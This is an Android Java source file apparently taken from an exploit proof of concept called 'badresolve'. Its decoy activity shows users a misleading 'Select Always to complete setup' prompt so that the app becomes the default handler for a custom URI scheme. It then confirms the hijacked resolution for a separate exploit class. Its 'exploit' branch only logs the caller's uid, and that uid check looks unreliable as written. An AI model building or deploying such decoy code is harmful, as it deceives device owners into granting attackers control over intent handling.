package com.cfks.badresolve;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

public class DecoyActivity extends Activity {
    
    private static final String TAG = "DecoyActivity";
    public static final String CUSTOM_SCHEME = "badresolve";
    public static final String SETUP_HOST = "setup";
    public static final String EXPLOIT_HOST = "exploit";
    public static final String ACTION_PREFERRED_SET = "com.cfks.badresolve.PREFERRED_SET";
    
    private Handler handler = new Handler();
    private boolean hasNotified = false;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.d(TAG, "DecoyActivity created, callingUid=" + Binder.getCallingUid());
        
        Uri data = getIntent().getData();
        
        if (getIntent().hasExtra("setup_preferred")) {
            setupPreferredMode();
            return;
        }
        
        if (data != null && CUSTOM_SCHEME.equals(data.getScheme())) {
            String host = data.getHost();
            if (SETUP_HOST.equals(host)) {
                setupPreferredMode();
            } else if (EXPLOIT_HOST.equals(host)) {
                handleExploitMode();
            } else {
                finish();
            }
        } else {
            finish();
        }
    }
    
    private void handleExploitMode() {
        int callingUid = Binder.getCallingUid();
        // 只允许系统服务或 Settings 调用 Exploit 模式
        if (callingUid == android.os.Process.SYSTEM_UID || 
            callingUid == android.os.Process.PHONE_UID ||
            callingUid == 1000) {  // SYSTEM_UID
            Log.d(TAG, "Valid exploit call from uid=" + callingUid);
        } else {
            Log.w(TAG, "Unauthorized exploit call from uid=" + callingUid);
        }
        finish();
    }
    
    private void setupPreferredMode() {
        Log.i(TAG, "Setup mode - prompting user to set as default");
        
        // 注册广播接收器，监听首选设置完成
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (ACTION_PREFERRED_SET.equals(intent.getAction()) && !hasNotified) {
                    hasNotified = true;
                    Log.i(TAG, "Preferred default set!");
                    BadResolveExploit.getInstance(context).markPreferredSet();
                    Toast.makeText(context, "Setup complete!", Toast.LENGTH_SHORT).show();
                }
            }
        }, new IntentFilter(ACTION_PREFERRED_SET));
        
        Intent chooserIntent = new Intent(Intent.ACTION_VIEW);
        chooserIntent.setData(Uri.parse(CUSTOM_SCHEME + "://" + EXPLOIT_HOST + "/setup"));
        chooserIntent.addCategory(Intent.CATEGORY_DEFAULT);
        chooserIntent.addCategory(Intent.CATEGORY_BROWSABLE);
        
        Intent wrapper = Intent.createChooser(chooserIntent, "Select 'Always' to complete setup");
        wrapper.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        
        try {
            startActivity(wrapper);
            Toast.makeText(this, "Select 'Always' when prompted", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Log.e(TAG, "Failed to show chooser", e);
            Toast.makeText(this, "Go to Settings > Apps > Default apps to set manually", Toast.LENGTH_LONG).show();
        }
        
        // 延迟检查并关闭
        handler.postDelayed(() -> {
            checkAndNotifyDefault();
            if (!isFinishing()) {
                finish();
            }
        }, 8000);
    }
    
    private void checkAndNotifyDefault() {
        Intent testIntent = new Intent(Intent.ACTION_VIEW);
        testIntent.setData(Uri.parse(CUSTOM_SCHEME + "://check"));
        testIntent.addCategory(Intent.CATEGORY_DEFAULT);
        testIntent.addCategory(Intent.CATEGORY_BROWSABLE);
        
        PackageManager pm = getPackageManager();
        ResolveInfo resolveInfo = pm.resolveActivity(testIntent, PackageManager.MATCH_DEFAULT_ONLY);
        
        if (resolveInfo != null && resolveInfo.activityInfo != null && 
            getPackageName().equals(resolveInfo.activityInfo.packageName)) {
            
            Log.i(TAG, "App is default handler!");
            Intent broadcast = new Intent(ACTION_PREFERRED_SET);
            sendBroadcast(broadcast);
        }
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        
        Uri data = intent.getData();
        if (data != null && CUSTOM_SCHEME.equals(data.getScheme()) && 
            EXPLOIT_HOST.equals(data.getHost())) {
            finish();
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
    }
}